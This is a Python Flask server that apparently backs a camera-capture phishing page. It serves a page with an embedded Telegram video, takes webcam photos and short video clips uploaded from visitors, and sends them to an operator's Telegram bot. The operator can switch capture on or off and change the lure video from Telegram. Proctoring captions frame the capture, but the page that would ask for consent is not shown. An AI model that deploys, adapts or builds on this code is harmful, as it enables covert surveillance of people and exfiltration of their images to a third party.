import os
import uuid
import requests
from flask import Flask, send_file, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
RENDER_URL = os.environ.get("RENDER_URL")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

current_video_url = "https://t.me/blackvaltofficial/8?embed=1&autoplay=1"
is_capturing = True


@app.route("/")
def home():
    return send_file("index.html")


@app.route("/get_video_link")
def get_video_link():
    return jsonify({
        "url": current_video_url,
        "capture": is_capturing
    })


@app.route("/upload_photo", methods=["POST"])
def upload_photo():
    if not is_capturing:
        return "Stopped", 200

    if "photo" in request.files:
        filename = f"temp_{uuid.uuid4().hex}.jpg"
        request.files["photo"].save(filename)

        try:
            with open(filename, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    files={"photo": f},
                    data={"chat_id": CHAT_ID, "caption": "📸 Student Snapshot"},
                    timeout=10
                )
        finally:
            os.remove(filename)

    return "OK"


@app.route("/upload_video", methods=["POST"])
def upload_video():
    if not is_capturing:
        return "Stopped", 200

    if "video" in request.files:
        filename = f"temp_{uuid.uuid4().hex}.webm"
        request.files["video"].save(filename)

        try:
            with open(filename, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                    files={"video": f},
                    data={"chat_id": CHAT_ID, "caption": "🎥 3 Sec Proctor Clip"},
                    timeout=20
                )
        finally:
            os.remove(filename)

    return "OK"


@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    global current_video_url, is_capturing
    data = request.get_json()

    if "message" in data:
        cid = str(data["message"]["chat"]["id"])
        text = data["message"].get("text", "")

        # ADMIN CONTROLS
        if cid == CHAT_ID:
            if text == "/start_capture":
                is_capturing = True
                msg = "✅ Capture Enabled"
            elif text == "/stop_capture":
                is_capturing = False
                msg = "🚫 Capture Disabled"
            elif "http" in text:
                current_video_url = text
                if "embed=1" not in current_video_url:
                    current_video_url += "?embed=1&autoplay=1"
                msg = "✅ Video Updated"
            else:
                return "OK"

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": msg}
            )

    return "OK"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
